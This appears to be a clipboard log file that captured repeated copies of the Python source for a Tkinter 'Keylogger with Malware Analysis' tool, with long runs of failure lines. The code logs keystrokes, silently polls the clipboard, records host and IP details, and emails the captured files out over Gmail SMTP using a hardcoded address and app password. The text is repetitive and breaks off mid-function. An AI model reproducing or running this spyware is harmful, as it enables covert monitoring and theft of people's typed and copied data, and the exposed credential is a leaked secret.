Clipboard Data: 
menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_compt_info_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)
Clipboard Data: 
capture_clipboard_menu
Clipboard Data: 
username = username_entry.get()
        password = password_entry.get()
Clipboard Data: 
start_clipboard_capture()
Clipboard Data: 
def show_clipboard_info_window():
    global text_area
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured Keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    # Text area to display captured clipboard information
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Function to update the text area with captured clipboard data
    def update_clipboard():
        text_area.delete(1.0, tk.END)  # Clear the text area
        text_area.insert(tk.END, '\n'.join(clipboard_data))  # Display all captured clipboard data

    # Update clipboard info every 1000 milliseconds (1 second)
    def continuous_update_clipboard():
        update_clipboard()
        screen.after(1000, continuous_update_clipboard)  # Schedule next update

    continuous_update_clipboard()  # Start the continuous update

    # Send Email button to send clipboard info via email
    send_email_button = tk.Button(screen, text="Send Clipboard Info via Email", command=lambda: send_email(clipboard_information))
    send_email_button.pack(pady=10)
Clipboard Data: 
screen.mainloop()
Clipboard Data: 
top_frame = tk.Frame(screen, bg="lightgray")
Clipboard Data: 
capture_screenshots()
Clipboard Data: 
screenshot_thread = threading.Thread(target=capture_screenshots)  # Start screenshot capture
        screenshot_thread.daemon = True
        screenshot_thread.start()
Clipboard Data: 
# Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    capture_screenshot_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=capture_screenshot_menu)
    capture_screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)
Clipboard Data: 
# Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    capture_screenshot_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=capture_screenshot_menu)
    capture_screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)
Clipboard Data: 
screenshot_thread = threading.Thread(target=capture_screenshots)  # Start screenshot capture
        screenshot_thread.daemon = True
        screenshot_thread.start()
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard could not be copied
Clipboard Data: 
import tkinter as tk
from tkinter import messagebox, scrolledtext
import random
import sqlite3
from PIL import Image, ImageTk, ImageGrab
from pynput.keyboard import Key, Listener
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
import socket
import platform
from requests import get
import win32clipboard
import time

# File where captured keylogs will be stored
keylog_file = "key_log.txt"
comp_info_file = "comp_info.txt"
clipboard_information = "clipboard.txt"


email_address = "eeml5084@gmail.com"
password = "vfnwzbhkcwkrysnr"
user_email = ""
captured_logs = []  # List to store captured keylogs in memory
clipboard_data = []

text_area = None
screen = None


# Database setup
def create_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    # Create users table with an ID column
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            email TEXT NOT NULL,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


# Function to send keylog txt file via email
def send_email(log_file):
    global user_email
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = user_email
        msg['Subject'] = "Captured Keylogs"
        body = "Please find the captured keylogs attached."
        msg.attach(MIMEText(body, 'plain'))

        # Attach the keylog file
        with open(log_file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(log_file)}")
            msg.attach(part)

        # Sending the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, user_email, text)
        server.quit()

        messagebox.showinfo("Success", "Email with keylogs sent successfully!")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to send email: {str(e)}")


# Function to write captured logs to a file
def write_logs_to_file(logs):
    with open(keylog_file, 'a') as file:  # Open the file in append mode
        file.write(''.join(logs))  # Write logs without adding a new line


# Function to start capturing keylogs and store them in memory
def start_keylog_capture():
    def on_press(key):
        try:
            key_str = str(key.char)
            captured_logs.append(key_str)  # Store key in memory
            write_logs_to_file([key_str])  # Write the key to the log file
        except AttributeError:
            if key == Key.space:
                captured_logs.append(' ')  # Store space key
                write_logs_to_file([' '])  # Write space to the log file
            else:
                key_str = f' [{str(key)}] '
                captured_logs.append(key_str)  # Store other keys
                write_logs_to_file([key_str])  # Write the key to the log file

    def on_release(key):
        if key == Key.esc:
            return False  # Stop the listener

    # Start the keylogger in a separate thread to capture in the background
    keylog_thread = threading.Thread(target=lambda: Listener(on_press=on_press, on_release=on_release).run())
    keylog_thread.daemon = True
    keylog_thread.start()

# Function to capture computer information
def computer_information():
    with open(comp_info_file, "w") as f:  # Open in write mode to overwrite each session
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


# Function to capture clipboard data
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        # Only add to clipboard_data if it's new
        if pasted_data not in clipboard_data:
            clipboard_data.append(pasted_data)
            with open(clipboard_information, "a") as f:
                f.write("Clipboard Data: \n" + pasted_data + "\n")
    except Exception as e:
        with open(clipboard_information, "a") as f:
            f.write("Clipboard could not be copied\n")

# Function to start monitoring clipboard data
def start_clipboard_capture():
    def monitor_clipboard():
        while True:
            copy_clipboard()
            time.sleep(2)  # Check clipboard every 2 seconds

    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()


# Function to register a user
def register_user(email, username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    unique_id = random.randint(1000, 9999)  # Generate a random ID
    # Insert user with the generated ID
    c.execute('INSERT INTO users (id, email, username, password) VALUES (?, ?, ?, ?)',
              (unique_id, email, username, password))
    conn.commit()
    conn.close()
    return unique_id


# Function to login a user
def login_user(username, password, user_id):
    global user_email  # Use the global variable to store email
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE username=? AND password=? AND id=?',
              (username, password, user_id))
    user = c.fetchone()
    if user:  # If user found, store email
        user_email = user[1]  # Email is the second column
    conn.close()
    return user


# Function to show the registration interface
def show_registration_interface():
    registration_window = tk.Toplevel()
    registration_window.title("Register")

    # Logo
    logo = Image.open("C:\\Users\\03080\\Desktop\\Picture1.png")
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)
    logo_image = ImageTk.PhotoImage(logo)
    logo_label = tk.Label(registration_window, image=logo_image)
    logo_label.image = logo_image
    logo_label.pack()

    tk.Label(registration_window, text="Email").pack()
    email_entry = tk.Entry(registration_window)
    email_entry.pack()

    tk.Label(registration_window, text="Username").pack()
    username_entry = tk.Entry(registration_window)
    username_entry.pack()

    tk.Label(registration_window, text="Password").pack()
    password_entry = tk.Entry(registration_window, show="*")
    password_entry.pack()

    def register():
        email = email_entry.get()
        username = username_entry.get()
        password = password_entry.get()
        if email and username and password:
            user_id = register_user(email, username, password)
            messagebox.showinfo("Success", f"Registration successful! Your ID is {user_id}.")
            registration_window.destroy()
        else:
            messagebox.showerror("Error", "Please fill in all fields.")

    register_button = tk.Button(registration_window, text="Register", command=register)
    register_button.pack()


# Function to show the login interface
def show_login_interface():
    login_window = tk.Tk()
    login_window.title("Login")

    # Logo
    logo = Image.open("C:\\Users\\03080\\Desktop\\Picture1.png")
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)
    logo_image = ImageTk.PhotoImage(logo)
    logo_label = tk.Label(login_window, image=logo_image)
    logo_label.image = logo_image
    logo_label.pack()

    tk.Label(login_window, text="KEYLOGGER WITH MALWARE ANALYSIS SANDBOX").pack()

    tk.Label(login_window, text="User ID").pack()
    id_entry = tk.Entry(login_window)
    id_entry.pack()

    tk.Label(login_window, text="Username").pack()
    username_entry = tk.Entry(login_window)
    username_entry.pack()

    tk.Label(login_window, text="Password").pack()
    password_entry = tk.Entry(login_window, show="*")
    password_entry.pack()

    def login():
        user_id = id_entry.get()
        username = username_entry.get()
        password = password_entry.get()
        user = login_user(username, password, user_id)
        if user:
            messagebox.showinfo("Success", "Login successful!")
            login_window.destroy()
            start_clipboard_capture()  # Start capturing keylogs after login
            computer_information()
            main_screen()  # Proceed to main screen after login
        else:
            messagebox.showerror("Error", "Invalid ID, username, or password.")

    login_button = tk.Button(login_window, text="Login", command=login)
    login_button.pack()

    register_button = tk.Button(login_window, text="Register", command=show_registration_interface)
    register_button.pack()

    login_window.mainloop()

# Function to display captured computer information in a new window
def show_computer_info_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured Keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    # Text area to display captured computer information
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the computer info from the file
    with open(comp_info_file, "r") as f:
        computer_info = f.read()
        text_area.insert(tk.END, computer_info)

    # Send Email button
    send_email_button = tk.Button(screen, text="Send Computer Info via Email", command=lambda: send_email(comp_info_file))
    send_email_button.pack(pady=10)

# Function to display captured clipboard info in a new window
def show_clipboard_info_window():
    global text_area
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured Keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    # Text area to display captured clipboard information
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Function to update the text area with captured clipboard data
    def update_clipboard():
        text_area.delete(1.0, tk.END)  # Clear the text area
        text_area.insert(tk.END, '\n'.join(clipboard_data))  # Display all captured clipboard data

    # Update clipboard info every 1000 milliseconds (1 second)
    def continuous_update_clipboard():
        update_clipboard()
        screen.after(1000, continuous_update_clipboard)  # Schedule next update

    continuous_update_clipboard()  # Start the continuous update

    # Send Email button to send clipboard info via email
    send_email_button = tk.Button(screen, text="Send Clipboard Info via Email", command=lambda: send_email(clipboard_information))
    send_email_button.pack(pady=10)


# Main Application Window with Menus and Logo
def main_screen():
    global text_area, screen, logo_img  # Use the global variables
    screen = tk.Tk()
    screen.geometry("800x600")
    screen.title("Keylogger with Malware Analysis")

    # Load logo image
    logo = Image.open("C:\\Users\\03080\\Desktop\\Picture1.png")  # Replace with your logo image path
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)  # Resample the image
    logo_img = ImageTk.PhotoImage(logo)

    # Create a top frame to hold the logo and the menu buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo at the top left in a frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    # Welcome interface
    welcome_frame = tk.Frame(screen)
    welcome_frame.pack(expand=True)

    welcome_label = tk.Label(welcome_frame, text="Welcome to the Keylogger with Malware Analysis!", font=("Arial", 16))
    welcome_label.pack(pady=20)


    screen.mainloop()

# Function to show the capture interface
def show_capture_interface():
    global text_area
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_clipboard_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    # Create the text area for displaying captured logs
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, width=50, height=20)
    text_area.pack(padx=10, pady=10)

    # Function to update the text area with captured logs
    def update_logs():
        text_area.delete(1.0, tk.END)  # Clear the text area
        text_area.insert(tk.END, ''.join(captured_logs))  # Display all captured logs

    # Update logs every 1000 milliseconds (1 second)
    def continuous_update():
        update_logs()
        screen.after(1000, continuous_update)  # Schedule next update

    continuous_update()  # Start the continuous update
    # Send email button at bottom right
    send_email_button = tk.Button(screen, text="Send Email", command=lambda: send_email(keylog_file))
    send_email_button.pack(side=tk.BOTTOM, anchor="e", padx=10, pady=10)


if __name__ == "__main__":
    create_db()  # Set up the database when the program starts
    show_login_interface()  # Start with the login interface
Clipboard Data: 
import tkinter as tk
from tkinter import messagebox, scrolledtext
import random
import sqlite3
from PIL import Image, ImageTk, ImageGrab
from pynput.keyboard import Key, Listener
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
import socket
import platform
from requests import get
import win32clipboard
import time

# File where captured keylogs will be stored
keylog_file = "key_log.txt"
comp_info_file = "comp_info.txt"
clipboard_information = "clipboard.txt"


email_address = "eeml5084@gmail.com"
password = "vfnwzbhkcwkrysnr"
user_email = ""
captured_logs = []  # List to store captured keylogs in memory
clipboard_data = []

text_area = None
screen = None


# Database setup
def create_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    # Create users table with an ID column
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            email TEXT NOT NULL,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


# Function to send keylog txt file via email
def send_email(log_file):
    global user_email
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = user_email
        msg['Subject'] = "Captured Keylogs"
        body = "Please find the captured keylogs attached."
        msg.attach(MIMEText(body, 'plain'))

        # Attach the keylog file
        with open(log_file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(log_file)}")
            msg.attach(part)

        # Sending the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, user_email, text)
        server.quit()

        messagebox.showinfo("Success", "Email with keylogs sent successfully!")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to send email: {str(e)}")


# Function to write captured logs to a file
def write_logs_to_file(logs):
    with open(keylog_file, 'a') as file:  # Open the file in append mode
        file.write(''.join(logs))  # Write logs without adding a new line


# Function to start capturing keylogs and store them in memory
def start_keylog_capture():
    def on_press(key):
        try:
            key_str = str(key.char)
            captured_logs.append(key_str)  # Store key in memory
            write_logs_to_file([key_str])  # Write the key to the log file
        except AttributeError:
            if key == Key.space:
                captured_logs.append(' ')  # Store space key
                write_logs_to_file([' '])  # Write space to the log file
            else:
                key_str = f' [{str(key)}] '
                captured_logs.append(key_str)  # Store other keys
                write_logs_to_file([key_str])  # Write the key to the log file

    def on_release(key):
        if key == Key.esc:
            return False  # Stop the listener

    # Start the keylogger in a separate thread to capture in the background
    keylog_thread = threading.Thread(target=lambda: Listener(on_press=on_press, on_release=on_release).run())
    keylog_thread.daemon = True
    keylog_thread.start()

# Function to capture computer information
def computer_information():
    with open(comp_info_file, "w") as f:  # Open in write mode to overwrite each session
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


# Function to capture clipboard data
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        # Only add to clipboard_data if it's new
        if pasted_data not in clipboard_data:
            clipboard_data.append(pasted_data)
            with open(clipboard_information, "a") as f:
                f.write("Clipboard Data: \n" + pasted_data + "\n")
    except Exception as e:
        with open(clipboard_information, "a") as f:
            f.write("Clipboard could not be copied\n")

# Function to start monitoring clipboard data
def start_clipboard_capture():
    def monitor_clipboard():
        while True:
            copy_clipboard()
            time.sleep(2)  # Check clipboard every 2 seconds

    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()


# Function to register a user
def register_user(email, username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    unique_id = random.randint(1000, 9999)  # Generate a random ID
    # Insert user with the generated ID
    c.execute('INSERT INTO users (id, email, username, password) VALUES (?, ?, ?, ?)',
              (unique_id, email, username, password))
    conn.commit()
    conn.close()
    return unique_id


# Function to login a user
def login_user(username, password, user_id):
    global user_email  # Use the global variable to store email
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE username=? AND password=? AND id=?',
              (username, password, user_id))
    user = c.fetchone()
    if user:  # If user found, store email
        user_email = user[1]  # Email is the second column
    conn.close()
    return user


# Function to show the registration interface
def show_registration_interface():
    registration_window = tk.Toplevel()
    registration_window.title("Register")

    # Logo
    logo = Image.open("C:\\Users\\03080\\Desktop\\Picture1.png")
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)
    logo_image = ImageTk.PhotoImage(logo)
    logo_label = tk.Label(registration_window, image=logo_image)
    logo_label.image = logo_image
    logo_label.pack()

    tk.Label(registration_window, text="Email").pack()
    email_entry = tk.Entry(registration_window)
    email_entry.pack()

    tk.Label(registration_window, text="Username").pack()
    username_entry = tk.Entry(registration_window)
    username_entry.pack()

    tk.Label(registration_window, text="Password").pack()
    password_entry = tk.Entry(registration_window, show="*")
    password_entry.pack()

    def register():
        email = email_entry.get()
        username = username_entry.get()
        password = password_entry.get()
        if email and username and password:
            user_id = register_user(email, username, password)
            messagebox.showinfo("Success", f"Registration successful! Your ID is {user_id}.")
            registration_window.destroy()
        else:
            messagebox.showerror("Error", "Please fill in all fields.")

    register_button = tk.Button(registration_window, text="Register", command=register)
    register_button.pack()


# Function to show the login interface
def show_login_interface():
    login_window = tk.Tk()
    login_window.title("Login")

    # Logo
    logo = Image.open("C:\\Users\\03080\\Desktop\\Picture1.png")
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)
    logo_image = ImageTk.PhotoImage(logo)
    logo_label = tk.Label(login_window, image=logo_image)
    logo_label.image = logo_image
    logo_label.pack()

    tk.Label(login_window, text="KEYLOGGER WITH MALWARE ANALYSIS SANDBOX").pack()

    tk.Label(login_window, text="User ID").pack()
    id_entry = tk.Entry(login_window)
    id_entry.pack()

    tk.Label(login_window, text="Username").pack()
    username_entry = tk.Entry(login_window)
    username_entry.pack()

    tk.Label(login_window, text="Password").pack()
    password_entry = tk.Entry(login_window, show="*")
    password_entry.pack()

    def login():
        user_id = id_entry.get()
        username = username_entry.get()
        password = password_entry.get()
        user = login_user(username, password, user_id)
        if user:
            messagebox.showinfo("Success", "Login successful!")
            login_window.destroy()
            start_clipboard_capture()  # Start capturing keylogs after login
            computer_information()
            main_screen()  # Proceed to main screen after login
        else:
            messagebox.showerror("Error", "Invalid ID, username, or password.")

    login_button = tk.Button(login_window, text="Login", command=login)
    login_button.pack()

    register_button = tk.Button(login_window, text="Register", command=show_registration_interface)
    register_button.pack()

    login_window.mainloop()

# Function to display captured computer information in a new window
def show_computer_info_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured Keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    # Text area to display captured computer information
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the computer info from the file
    with open(comp_info_file, "r") as f:
        computer_info = f.read()
        text_area.insert(tk.END, computer_info)

    # Send Email button
    send_email_button = tk.Button(screen, text="Send Computer Info via Email", command=lambda: send_email(comp_info_file))
    send_email_button.pack(pady=10)

# Function to display captured clipboard info in a new window
def show_clipboard_info_window():
    global text_area
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured Keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    # Text area to display captured clipboard information
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
